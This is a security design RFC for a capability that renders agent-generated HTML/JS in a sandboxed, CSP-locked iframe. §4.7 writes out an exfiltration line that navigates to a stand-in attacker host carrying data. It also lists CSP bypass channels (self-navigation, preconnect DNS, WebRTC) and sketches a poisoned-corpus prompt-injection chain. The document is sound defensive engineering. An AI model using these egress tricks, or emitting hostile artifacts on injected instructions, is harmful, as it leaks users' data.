# RFC — HTML Artifact Capability: agent-generated HTML/CSS/JS with a sandboxed preview

**Status:** Shipped. Kept only as the design record for the capability's shape
and the containment reasoning behind §4.7. **The JavaScript policy in this
document is superseded**: script is no longer unconditional, it is granted per
team. The current truth is
`openspec/specs/html-artifact-javascript-policy/spec.md` (issue #2798); where the
two disagree, that spec and the code win. This RFC has no open question left and
is a candidate for archival once §4.7's containment rationale has a home in a
compact doc.
**Author:** Maxime Daragon
**Date:** 2026-08-31
**Area:** `fred-runtime` (new capability package), `frontend`
**Related:** `AGENT-CAPABILITY-PRESENTATION.html` (part-renderer / side-panel
architecture), `CAPABILITY-EXECUTION-FLOW-RFC.md`, the `add-fred-capability`
skill, and the `writable_document` capability
(`libs/capabilities/fred-capability-writable-document/`) used as the reference vertical.

---

## 1. Problem

An agent has no way to produce a **rendered** web page or component. Asked to
"make me a landing section" or "show me this table as a styled HTML card", the
model can only paste HTML/CSS as a code block in the chat — the user sees source,
not the result, and must copy it out and open it themselves. Claude's artifacts
show the value of rendering agent-produced markup inline; Fred has nothing
equivalent. A reuse audit (2026-08-31) confirms **zero** existing capability,
builtin renderer, or RFC covers HTML/CSS/web/artifact rendering (the only inline
"render agent output" precedent is `MermaidBlock`, which is unsandboxed SVG via
`dangerouslySetInnerHTML` and not reusable here).

---

## 2. Goals

1. Give an agent one tool to emit a self-contained HTML/CSS/JS artifact.
2. Render it live in a **dedicated viewer that opens to the right of the chat**,
   with a tabbed, **read-only** surface: **Preview** (rendered) / **HTML**
   (source) / **CSS** (source).
3. Render untrusted, LLM-generated markup **safely** — script runs isolated, with
   no access to the app's origin or storage, and no network reach: subresources by
   CSP, self-navigation by the shell's `frame-src` (§4.7).
4. Let the user **download** the artifact as a self-contained `.html`.
5. Reuse the shipped capability-presentation machinery (typed chat part +
   side panel + part-renderer registry) rather than inventing a parallel path;
   mirror `writable_document` end to end.

---

## 3. Non-goals (v1)

- **No external resources and no network.** JavaScript is allowed (amended
  2026-09-24, §4.7), but the artifact must be self-contained: the CSP refuses
  every remote subresource and every network call.
- **No editing / no server-side persistence.** The viewer is read-only. There is
  no owned table, no router, no PUT. (Explicitly deferred — see §8.)
- **No agent read-back.** The agent does not re-ingest a prior artifact to
  continue editing it (deferred with persistence).
- **No per-agent configuration.** The capability needs no agent-creation config.
- **Not a general web sandbox / not a code runner.** No server-side execution, no
  network reach — a page that runs its own inline script, nothing more.

---

## 4. Design

### 4.1 Lane and shape

Full **capability package** lane (per the `add-fred-capability` skill §7 table):
it contributes a **custom chat part** (the artifact card) and a **side panel**
(the viewer), neither of which the MCP lane can express. It is
`execution_models = ("react",)` because it carries a system-prompt fragment via a
`middleware()` override (§4.5), exactly like `writable_document`/`ppt_filler`.

New package: `libs/capabilities/fred-capability-html-artifact/fred_capability_html_artifact/`,
mirroring `writable_document`'s structure minus the store/router (§5).

### 4.2 Typed models

`AgentCapability[EmptyModel, EmptyModel, EmptyModel]` — `ConfigModel`,
`StoredConfigModel`, and `TurnOptionsModel` are all `EmptyModel` (no
agent-creation config, no save-time enrichment, no chat control). Same as
`writable_document`.

### 4.3 The tool

Carried by the capability's middleware (ReAct), LLM-visible arguments only:

```
render_html_artifact(
    title: str,            # short human label for the artifact
    html: str,             # HTML markup (full document or fragment)
    css: str = "",         # CSS, kept separate for the CSS tab; injected at render
    artifact_id: str | None = None,  # stable id to update a prior artifact in-session
)
```

Identity (`session_id`, `user_id`) is closed over from `CapabilityContext` and
**never** appears in the tool schema (the hard split, RFC §3.5). The tool returns
`response_format="content_and_artifact"`: a short text confirmation for the model
plus a `ToolInvocationResult(ui_parts=(HtmlArtifactPart(...),))`. The text tells
the model a preview opened and **not** to also paste the code into the chat
(mirrors `ppt_filler`'s and `writable_document`'s return contract).

`artifact_id` lets a follow-up call ("make the header blue") supersede the same
card/preview instead of stacking a new one — the frontend slice keeps
newest-wins per id (mirrors `writableDocumentSlice`).

### 4.4 The chat part (content carried inline)

```
class HtmlArtifactPart(BaseModel):
    type: Literal["html_artifact"] = "html_artifact"
    artifact_id: str
    title: str
    html: str
    css: str
    version: str            # per-render hash, so a re-render remounts the viewer
```

The markup travels **inline in the part** (like `WritableDocumentPart.content_md`).
No owned table: chat `ui_parts` are persisted server-side (#2464), so the artifact
survives a conversation reload without a capability store.

**Size cap (§9.1 resolved): 256 KB combined `html`+`css`.** There is no published
fixed byte limit for Claude.ai artifacts — the effective bound there is the
model's single-message output-token budget; 256 KB (~one full large output
message at ~4 chars/token) is the engineering equivalent. Over the cap, the tool
returns an `is_error` result steering the model to trim, rather than persisting a
history-bloating blob.

### 4.5 Prompt fragment

A one-line always-on system note via a `middleware()` `wrap_model_call` override
(mirrors `writable_document`'s `_WRITE_INSTRUCTIONS`): "When the user asks for a
web page, component, mockup, or styled HTML, call `render_html_artifact` with the
HTML and CSS; a rendered preview opens beside the chat — never paste the code into
the chat. Keep the artifact self-contained — no external resources and no network
calls, which are blocked."

Superseded in one respect: the fragment now has **two variants**, and which one is
delivered follows the team's `allow_javascript` setting, so a team that may not
run script is never offered it. See the capability spec (issue #2798).

### 4.6 Frontend — the viewer

New plugin `apps/frontend/src/rework/features/capabilities/html_artifact/`,
mirroring the `writable_document` plugin:

- **Card renderer** `HtmlArtifactCardRenderer` — compact in-message card (icon,
  title, "Open preview" button, download). Feeds each part into the slice and
  auto-opens the panel on a live render (same heuristic/probe pattern already used
  by the two shipped capabilities).
- **Side panel** `HtmlArtifactPane` — opens right of the chat. **This is the one
  net-new UI primitive.** **Read-only.** Shipped as a tabbed pane (Preview / HTML /
  CSS); **as of 2026-09-01 the source tabs were dropped** — the pane always shows
  the Preview and the source stays reachable via Download / open-in-new-tab. The
  code editor `CodeBlock` is no longer used here (the §9.3 "no new dependency"
  point is moot). A single controls bar carries the multi-artifact switcher tabs
  (max-width 6rem, full title on hover) on the left and the zoom controls on the
  right.
  - **Preview** — a sandboxed `<iframe srcdoc={composed} sandbox="...">` (§4.7),
    double-buffered so a re-render/zoom never flashes the blank frame (see
    `previewBuffers.nextBufferAction`).
  - **Download** — a format menu (2026-09-01): **HTML** (composed self-contained
    file, CSS inlined), plus **PNG** and **PDF** built from the SAME faithful
    render — the artifact is laid out off-screen, its DOM serialized, and rasterized
    through an `<svg><foreignObject>` loaded as an `<img>` (secure static mode: no
    scripts, no external loads — hence the pre-script capture warned about in
    §4.7). PNG is that canvas; PDF wraps the canvas JPEG in a
    hand-assembled one-page document (no PDF library). Both capture the real
    background and add none of the browser print chrome. (Print-to-PDF was tried
    first and dropped: browsers omit backgrounds and inject header/footer/margins.)
    All paths render the same sanitized + CSP-locked document, so no author script runs.
- **Slice** `htmlArtifactSlice` — the cross-component bus (a card deep in the
  thread drives the far-away panel), newest-`version`-wins per `artifact_id`.
  Mirrors `writableDocumentSlice`.

Registration is the two sanctioned one-line edits: the plugin object into
`features/capabilities/index.ts`, and the backend entry-point line. No
hand-editing of the `UiPart` union or the part-renderer/side-panel registries
(they extend at boot / by declaration).

**Composition** (Preview + Download): the `html` and `css` are combined into one
document — the author markup (fragment OR full document) is ALWAYS placed inside
OUR shell's `<body>`, with our head (charset + CSP `<meta>` + author `<style>`)
first: `<!doctype html><html><head>…CSP…</head><body>{html}</body></html>`. We
never splice into an author-provided `<head>`/`<html>`, so the CSP meta is always
the first thing the parser reaches and therefore governs EVERY author subresource
(a meta CSP only applies to content parsed after it — see §4.7). The same composed
string feeds both the iframe `srcdoc` and the download blob. Author CSS is
neutralized against a `</style>` breakout before it enters the `<style>` element.

### 4.7 Security — JS isolated on every output path (the load-bearing part)

**Amended 2026-09-24.** v1 forbade JavaScript outright and enforced that with
three layers. The blanket prohibition is lifted: an artifact needs JS for tabs,
accordions, animations and charts, and refusing it made the capability produce
dead mockups. Script is **isolated rather than removed**, which changes what the
layers are for — browser-enforced primitives contain script instead of three
independent mechanisms deleting it. The superseded §6 alternative 5 ("Allow
JavaScript — deferred") is hereby taken.

**Superseded 2026-09-25 (issue #2798).** "Every artifact frame is
`sandbox="allow-scripts"`" below is no longer true, and neither is the assumption
that every artifact executes. Script is granted **per team**: an opted-in team's
artifact frame carries `allow-scripts`, and a restricted team's carries no token
at all, so nothing executes. Everything else in this section still holds and
applies to BOTH modes — in particular the CSP, which is what blocks egress from
markup alone, and the shell plus `frame-src blob:`, which the download path needs
regardless of posture. Read the rest with that substitution in mind; the spec
under `openspec/specs/html-artifact-javascript-policy/` is the current contract.

The markup is untrusted LLM output and it executes. Isolation rests on two
mechanisms, both enforced by the browser and unbypassable by content
(`htmlArtifactDocument.ts`):

**Three mechanisms, and the third is not optional.**

**1. The frame sandbox.** Every artifact frame is `sandbox="allow-scripts"` and
**never** `allow-same-origin`. The pair is the one combination that must never
ship: together they let the content clear its own sandbox and reach the app's
DOM, cookies and storage. With `allow-scripts` alone the artifact holds an opaque
origin — no `window.parent`, no app storage, no cookies — and
`allow-top-navigation`/`allow-popups` stay omitted. The single token lives in one
exported constant, `ARTIFACT_SANDBOX`, asserted by tests in
`htmlArtifactDocument.test.ts` and `HtmlArtifactPane.sandbox.test.tsx`.

**2. The CSP.** A restrictive `<meta http-equiv>` in every composed document:
`default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
img-src data:; font-src data:; base-uri 'none'; form-action 'none'; webrtc 'block'`.
Inline script runs; no **subresource fetch** of any kind succeeds — no fetch, XHR,
WebSocket, `sendBeacon`, `<a ping>`, remote script, stylesheet, font or image — and
`webrtc 'block'` closes the one egress API that no fetch directive covers.
'unsafe-eval' is deliberately absent, so `eval`/`new Function` throw and
`setTimeout("string")` silently never runs; the prompt fragment tells the model so.
The author markup always goes in OUR body, never spliced into an author `<head>`,
so the meta is the first thing the parser reaches and governs every author
subresource and script (a meta CSP only applies to content parsed after it).

**3. `frame-src blob:` on the enclosing shell — the one that was missing.** A CSP
governs *subresource fetches*; it has never governed a document **navigating
itself**, and `navigate-to` was specced and then dropped, so no directive an
artifact carries can stop `location.href = "https://attacker/?d=" + data`. A
sandboxed browsing context may always navigate itself: the sandbox flag prevents
navigating contexts *other than* itself. Worse, the sandbox attribute survives that
navigation and the CSP does not — CSP is per-document and inherits only across local
schemes — so one assignment replaces the artifact with an attacker page holding
unrestricted `fetch()`, rendered inside the Fred UI with no URL bar to contradict it.

The control therefore has to sit on the **parent** document, and the artifact has to
arrive by a URL `frame-src` can match — hence the shell hands it to the child frame
as a `blob:` URL rather than inline `srcdoc`, which offers `frame-src` nothing to
match. The blob document **inherits the shell's policy** (CSP propagates across
local schemes), so the shell carries the full artifact policy plus `frame-src blob:`.

Measured in Chrome 153 against a local listener, in the production nesting shape and
on `file://` alike: without the directive an artifact doing
`location.href="http://host/?d=SECRET"` produced `GET /?d=SECRET`; with it, **zero
requests while its script still ran**. Both halves matter — an earlier candidate,
`frame-src 'none'`, produced zero requests *because it blocked the artifact frame
outright*, which would have removed the feature rather than secured it.

**A residual that content filtering narrows but does not close.** `<link
rel="preconnect">` and `rel="dns-prefetch"` perform no fetch, so no CSP directive
reaches them, and they egress a hostname (DNS + SNI) **even from a frame that cannot
run script** — measured. `composeHtmlDocument` therefore **renames** the element to
`<x-link>` rather than deleting it. Deleting needs a closing `>` an author can simply
withhold, and cutting text out can splice a fresh `<link` together from what
surrounded the hole; both were measured egressing in Chrome 153, and the first also
went out through the PNG/PDF frame, whose only other isolation is that script cannot
run. Renaming leaves an unknown element however the tag terminates.

What this does **not** cover is script: an artifact can append a live `<link>` at
runtime, which no markup pass can see. On the three scripting paths the hostname
channel therefore stays open. Content filtering is the only one left here, and it
exists because policy cannot express this at all.

An opaque origin also means `localStorage`, `sessionStorage` and cookies are
unavailable and **throw** on access. That is a consequence of the isolation, not a
bug to work around: the prompt fragment and the tool docstring tell the model to
keep artifact state in JavaScript variables.

Content sanitization (the former Layer A, DOMPurify) is **retired**: its entire
purpose was removing the script we now want, and keeping it would silently break
every interactive artifact. Author CSS is still neutralized against a `</style>`
breakout — cheap, and it keeps the style element well-formed.

**Every output path, and what covers it.** The sandbox argument is only sound
path by path; three of the five have no application frame to rely on:

| Path | Frame | Isolation |
| --- | --- | --- |
| In-app preview | shell → `sandbox="allow-scripts"` + `blob:` child | sandbox + CSP + `frame-src` |
| New browser tab | shell → `sandbox="allow-scripts"` + `blob:` child | sandbox + CSP + `frame-src` |
| `.html` download | shell → `sandbox="allow-scripts"` + `blob:` child | sandbox + CSP + `frame-src` |
| PNG export | `sandbox="allow-same-origin"`, no scripts | script cannot run; `<link>` defused |
| PDF export | `sandbox="allow-same-origin"`, no scripts | script cannot run; `<link>` defused |
| **Copy to clipboard** | none — plain text handed to the user | **the user's own judgement** |

The clipboard is a real sixth path and is not contained by any of the above: Copy
hands over the readable composed document, author script included, because that is
what Copy is for — the source already shown in the HTML/CSS tabs, in a form someone
can edit or host. Pasted into a CMS HTML field it is that site's problem, on that
site's origin. It stays deliberately unwrapped; the download is the wrapped one.

**All three scripting paths share one trusted shell** (`sandboxedShellDocument`), an
author-free top document that bootstraps the artifact into a `blob:`-URL child frame.
Two reasons, and the first applied from v1: the artifact may never BE the top
document of its origin, because a `blob:` URL is same-origin with the app and a saved
file opened by double-click is the top document on `file://`. The second is the
`frame-src` above, which is why the preview was moved into the shell too rather than
rendering the artifact directly.

The downloaded `.html` is therefore a bootstrap wrapper, not editable markup: it
renders correctly anywhere, but someone who wants source to edit or host should use
the HTML/CSS tabs or Copy. The Help Center says so.

**The guarantee is browser-scoped.** It rests on `sandbox` and CSP being honoured.
A saved artifact opened by an embedded renderer that ignores them — some Electron
apps, mail preview panes, HTML-to-PDF pipelines — gets none of it.

The **PNG/PDF export** frame is the one that grants `allow-same-origin`, because
rasterizing must read `contentDocument`. It must therefore never gain
`allow-scripts`; without it the browser refuses to run the artifact's script
whatever the CSP says. The consequence is functional, not a weakness: a JS-driven
artifact rasterizes in its **pre-script state**, and the viewer says so with an
info toast when the artifact carries script. The token is an exported constant,
`MEASURE_SANDBOX`, frozen by a test.

**Verification** (§10): `htmlArtifactDocument.test.ts` asserts author script
survives composition intact (a sanitizer regression would break every interactive
artifact), that the CSP permits inline script while refusing egress, that the
shell never grants `allow-same-origin`, and that the download ships the shell with
the artifact escaped one level down; `HtmlArtifactPane.sandbox.test.tsx` pins the
preview frames' attribute. Each guard was falsified by mutation before being
trusted — adding `allow-same-origin`, shipping the bare document on download, and
dropping `script-src` each fail the suite. A real-browser execution canary
(Playwright) remains out of scope; the sandbox is a browser primitive.

**Revising replaces, and a view can be closed (2026-09-24).** `artifact_id` existed
from v1 but the model had to remember it from its own tool output, which it did not
do reliably — so "change the heading" opened a second view. Revising is now the
DEFAULT: an omitted `artifact_id` targets the artifact already in the viewer, and
`new_artifact=true` is what opens a separate one. Because capability middleware is
rebuilt per turn, the open id cannot be held in memory; it is recovered from the
transcript (the tool announces it in its own result text) and named in the prompt
overlay, so the model is told the id rather than asked to recall it. The viewer's
tabs each carry a close control; a closed artifact keeps its snapshot so its chat
card reopens it, and a close is undone by a genuine new revision but not by a
same-content replay of the card.

**Deliberately not mitigated (decided 2026-09-24).** An artifact opens and runs on
arrival, with no user gesture. So the chain "poisoned document in the team corpus →
the agent emits an artifact → its script runs" needs no click, and a run gate was
considered and **declined: the friction falls on every artifact, and almost all of
them are exactly what the user asked for.** What that leaves an unrequested artifact
able to do, given the containment above: burn CPU in its own frame (the preview
keeps two buffers alive, so twice over), and display something misleading to social-
engineer the reader. It cannot send anything out, read local files, or reach the app.
The reader does get a **stop control** instead, which is the same protection moved
to where it costs nothing: the viewer offers "Stop the page" whenever the artifact
can execute, and it works by UNMOUNTING the preview frames, so the browsing contexts
are destroyed and scripts, timers and workers stop with them. A gate charges every
artifact for the rare bad one; a stop charges only the bad one. It does not prevent
the first moments of execution, so it answers the runaway page and the misleading
page, not a payload that does its damage on load — which the containment above is
what actually covers. Revisit the gate if that containment ever weakens: it is the
only mitigation here that does not depend on a browser behaving as specified.

This is a **security-sensitive change** and must go through `/security-review`
before merge (§10).

---

## 5. Why inline-in-part, not an owned table

`writable_document` owns a table because it is **editable and persisted** (autosave
PUT, list/get/export router). v1 here is read-only, so none of that is needed:
the artifact is self-contained content that the part already carries, and #2464
persists parts across reload. Dropping the store/router/migration removes an
Alembic tree, a FastAPI router, a generated API slice, and the per-team authz on
those routes — a materially smaller surface, in line with the consolidation
phase's "smaller, single-purpose, more deletion than addition." The editable v2
(§8) is exactly where the `writable_document` store/router shape gets adopted.

---

## 6. Alternatives considered

1. **MCP-lane capability (tools + prompt only).** Rejected: cannot contribute a
   custom chat part or a side panel, which are the whole point (rendered viewer).
2. **Owned table from day one.** Rejected for v1: no editing/persistence need;
   adds a migration + router + generated slice for nothing. Adopt in v2.
3. **Single self-contained `html` argument (CSS already inlined).** Rejected: the
   user wants distinct HTML and CSS tabs, so the tool keeps them separate and
   composes only at render/download.
4. **`MermaidBlock`-style inline `dangerouslySetInnerHTML` render.** Rejected:
   unsandboxed; unacceptable for arbitrary LLM HTML/CSS (XSS/exfiltration).
5. **Allow JavaScript (full artifacts).** Deferred in v1, **taken 2026-09-24**:
   the design did leave room to widen the sandbox without a rewrite, and that is
   what happened — `allow-scripts` on the artifact frames, `script-src
   'unsafe-inline'` added to the CSP, the sanitizer retired, and the download moved
   onto the same sandboxed shell as the new tab (§4.7).

---

## 7. Impact on existing contracts

- **New chat-part discriminator** `"html_artifact"` — must be unique (boot rejects
  duplicates). New **side-panel widget** `"html_artifact_pane"`.
- **Capability catalog** picks the manifest up automatically via the
  `fred.capabilities` entry point; no control-plane code (the capability boundary).
- **Frontend plugin registry** gains one entry; the generated-client rule does not
  apply (no router → no API slice in v1).
- **i18n**: `capability.html_artifact.name` / `.description` + viewer labels
  (tabs, download, empty state), en + fr.
- **Icon**: `code` — a snake_case Material Symbol already present in the
  `materialIcons` list in `apps/frontend/.../utils/Type.ts` (§9.4 resolved).
- **Docs**: on completion, add the capability to `AGENT-CAPABILITY-PRESENTATION`'s
  shipped-capabilities list and fold the settled design into the relevant compact
  doc; this RFC is then trimmed to any still-open part (per the doc workflow).

No change to frozen execution/product contracts is expected (the capability
system already carries chat parts and side panels generically).

---

## 8. Deferred — v2 (editable + persisted), out of scope here

When editing is wanted: adopt the `writable_document` store/router shape — an
owned `cap_html_artifact_*` table, a router (`list`/`get`/`update`/`export`), the
generated API slice, and per-row authz — turn the read-only tabs into editors with
live preview + debounced autosave, and optionally let the agent read back the
current HTML/CSS to keep working on it. The v1 part/slice/pane are designed so
this is an extension, not a rewrite.

---

## 9. Resolved decisions

1. **Artifact size cap — 256 KB combined `html`+`css`.** No published fixed byte
   limit exists for Claude.ai artifacts (the real bound is per-message output
   tokens); 256 KB is the engineering equivalent (§4.4). Over-cap → `is_error`.
2. **Fragment vs full document — accept both.** The `html` argument may be a
   complete document (`<!doctype html>…`) or a bare fragment (e.g. one
   `<div>…</div>`). The render/download composition (§4.6) ALWAYS wraps the author
   markup inside our own shell body with our CSP-first head — it never splices into
   an author-provided `<head>`/`<html>` (a security requirement: the CSP meta must
   precede all author markup, §4.7). The agent need not know which it produced.
3. **Syntax highlighting — reuse the existing `CodeBlock` molecule**
   (`react-syntax-highlighter`, already a dependency). No new dependency (§4.6).
4. **Icon — `code`** (already in the `materialIcons` list, §7).

---

## 10. Security review

The sandbox/CSP in §4.7 is the correctness-critical part. Before merge: run
`/security-review` on the diff.

**Amended 2026-09-24**, since script is now allowed (§4.7) and this section
previously asked the reviewer to confirm the opposite. What to check now:

- `allow-same-origin` appears on no frame that can run script, and nowhere at all
  alongside `allow-scripts`;
- the enclosing shell carries `frame-src blob:` and the artifact arrives as a
  `blob:` URL — the pair is what blocks self-navigation, and each half is useless
  without the other;
- no **egress** from an artifact frame, which is not the same question as "can it
  run script": `<link rel=preconnect>`, WebRTC and self-navigation each bypass a
  fetch-directive-only reading of the policy;
- the `allow-*` tokens that are deliberately omitted (`popups`, `top-navigation`,
  `modals`, `downloads`, `forms`, `same-origin`) are still omitted;
- correct CSP composition for both full documents and wrapped fragments.

**Test what a browser decides, not only what the code composes.** The claim that
needed a real browser was never the sandbox — that is a browser primitive — but the
CSP's coverage of *navigation*, and a string-composition suite cannot reach it. A
single headless-Chrome assertion (artifact attempts egress; no request reaches a
local listener; a paired control proves the harness would have seen one) is the
load-bearing check, and one round of it found a full-bandwidth exfiltration path
that the unit suite passed. Automating it is deliberately still out of scope — the
repo has no e2e infrastructure — so it is a manual gate on this section.

---

## 11. Build plan (after developer sign-off — not started)

1. GitHub issue (link this RFC).
2. Backend package: capability class + `HtmlArtifactPart` + tool + prompt-fragment
   middleware + entry point. Unit tests (`registry.validate()` green; tool with a
   stubbed context; over-cap rejection).
3. Frontend plugin: card, tabbed read-only pane (sandboxed iframe + source tabs +
   download), slice; register the plugin; i18n.
4. `make test` + `make code-quality` in `libs/fred-runtime` (+ frontend); then
   `/code-review` and `/security-review`.
5. Fold the settled design into the compact presentation doc; trim this RFC.
